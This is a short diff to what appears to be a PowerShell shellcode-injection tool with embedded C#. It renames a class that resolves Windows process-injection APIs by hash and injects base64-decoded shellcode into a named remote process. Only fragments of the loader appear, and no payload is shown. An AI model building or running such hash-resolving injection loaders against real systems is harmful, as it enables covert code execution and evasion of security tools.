@@ -25,7 +25,7 @@ public class RemoteApiHashingThreadInjection
     private static WriteProcessMemoryDelegate WriteProcessMemory;
     private static CreateRemoteThreadDelegate CreateRemoteThread;
 
-    static RemoteThreadInjection()
+    static RemoteApiHashingThreadInjection()
     {
         OpenProcess = (OpenProcessDelegate)GetFunctionPointerWithHash("kernel32.dll", 0x16BA1DC6);
         VirtualAllocEx = (VirtualAllocExDelegate)GetFunctionPointerWithHash("kernel32.dll", 0x04CE1B3B);
@@ -136,5 +136,5 @@ function Invoke-RemoteThreadApiHashing {
     )
 
     $shellcode = [Convert]::FromBase64String($ShellcodeBase64)
-    [RemoteThreadInjection]::Inject($ProcessName, $shellcode)
+    [RemoteApiHashingThreadInjection]::Inject($ProcessName, $shellcode)
 }
